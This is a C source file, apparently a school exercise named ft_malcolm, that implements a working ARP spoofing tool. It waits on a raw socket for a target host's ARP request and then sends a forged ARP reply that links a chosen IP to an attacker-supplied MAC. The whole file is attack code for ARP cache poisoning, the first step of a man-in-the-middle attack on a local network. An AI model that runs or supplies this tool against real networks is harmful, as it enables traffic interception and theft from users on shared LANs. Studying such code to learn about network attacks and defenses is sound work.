#include "ft_malcolm.h"

void capture_arp_packets(int sockfd, char *source_ip, char *target_ip) {
    unsigned char buffer[ETH_FRAME_LEN];
    struct sockaddr_ll sa;
    socklen_t sa_len = sizeof(sa);

    while (1) 
    {
        int len = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa, &sa_len);
        if (len < 0)
        {
            handle_error();
            continue;
        }

        struct ether_header *eth_header = (struct ether_header *)buffer;
        if (ntohs(eth_header->ether_type) != ETHERTYPE_ARP)
            continue;
        
        struct ether_arp *arp_pkt = (struct ether_arp *)(buffer + sizeof(struct ether_header));
        if (ntohs(arp_pkt->ea_hdr.ar_op) != ARPOP_REQUEST)
            continue;

        char sender_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, arp_pkt->arp_spa, sender_ip, sizeof(sender_ip));
        if (ft_strncmp(sender_ip, target_ip, INET_ADDRSTRLEN) != 0)
            continue;

        char requested_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, arp_pkt->arp_tpa, requested_ip, sizeof(requested_ip));
        if (ft_strncmp(requested_ip, source_ip, INET_ADDRSTRLEN) != 0)
            continue;

        printf("ARP request detected for IP %s\n", requested_ip);
        return;
    }
}

void send_arp_reply(int sockfd, const char *src_ip, const char *src_mac, const char *target_ip, const char *target_mac, const char *iface_name) {
    arp_packet packet;
    struct sockaddr_ll sa;
    int ifindex;

    ft_bzero(&packet, sizeof(packet));
    ifindex = if_nametoindex(iface_name);
    if (ifindex == 0){
        handle_error();
        return;
    }

    ft_bzero(&sa, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = ETH_ALEN;

    unsigned char src_mac_bytes[6], target_mac_bytes[6];
    parse_mac_safe(src_mac, src_mac_bytes);

    parse_mac_safe(target_mac, target_mac_bytes);
    
    // fill ethernet header
    ft_memcpy(packet.ether_header.ether_dhost, target_mac_bytes, ETH_ALEN);
    ft_memcpy(packet.ether_header.ether_shost, src_mac_bytes, ETH_ALEN);
    packet.ether_header.ether_type = htons(ETHERTYPE_ARP);

    // fill arp packet
    packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    packet.arp.ea_hdr.ar_hln = ETH_ALEN;
    packet.arp.ea_hdr.ar_pln = 4;
    packet.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

    // Fill MAC and IP source
    ft_memcpy(packet.arp.arp_sha, src_mac_bytes, ETH_ALEN);
    inet_pton(AF_INET, src_ip, packet.arp.arp_spa);

    // Fill MAC and IP Target/destination
    ft_memcpy(packet.arp.arp_tha, target_mac_bytes, ETH_ALEN);
    inet_pton(AF_INET, target_ip, packet.arp.arp_tpa);

    // send packet
    sleep(10);
    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        handle_error();
}

char *find_interface() {
    struct ifaddrs *ifaddr, *ifa;
    char *interface = NULL;

    if (getifaddrs(&ifaddr) == -1) {
        handle_error("getifaddrs");
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        if (ifa->ifa_addr->sa_family == AF_PACKET) {
            if ((ifa->ifa_flags & IFF_UP) && (ifa->ifa_flags & IFF_RUNNING)){
                if (!(ifa->ifa_flags & IFF_LOOPBACK)){
                    interface = ifa->ifa_name;
                    break;
                }
            }
        }
    }

    freeifaddrs(ifaddr);
    return interface;
}

int main(int argc, char *argv[]) {
    char *interface = NULL;

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <source IP> <source MAC> <target IP> <target MAC>\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (!validate_ip(argv[1])) {
        fprintf(stderr, "Invalid source IP address: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    if (!validate_mac(argv[2])) {
        fprintf(stderr, "Invalid source MAC address: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    if (!validate_ip(argv[3])) {
        fprintf(stderr, "Invalid target IP address: %s\n", argv[3]);
        return EXIT_FAILURE;
    }

    if (!validate_mac(argv[4])) {
        fprintf(stderr, "Invalid target MAC address: %s\n", argv[4]);
        return EXIT_FAILURE;
    }

    interface = find_interface();

    if (!interface) {
        fprintf(stderr, "No interface found.\n");
        return EXIT_FAILURE;
    }

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd == -1) {
        handle_error("socket");
    }

    // Bind socket to interface
    struct sockaddr_ll sll;
    ft_bzero(&sll, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(interface);
    sll.sll_protocol = htons(ETH_P_ARP);
    if (sll.sll_ifindex == 0) {
        handle_error();
    }
    if (bind(sockfd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        handle_error();
    }

    printf("Valid interface found: %s\n", interface);

    printf("Waiting for ARP request for %s...\n", argv[1]);
    capture_arp_packets(sockfd, argv[1], argv[3]);

    // Enviar resposta ARP depois de capturar a solicitação ARP
    printf("Sending ARP reply to %s...\n", argv[3]);
    send_arp_reply(sockfd, argv[1], argv[2], argv[3], argv[4], interface);

    close(sockfd);
    return EXIT_SUCCESS;
}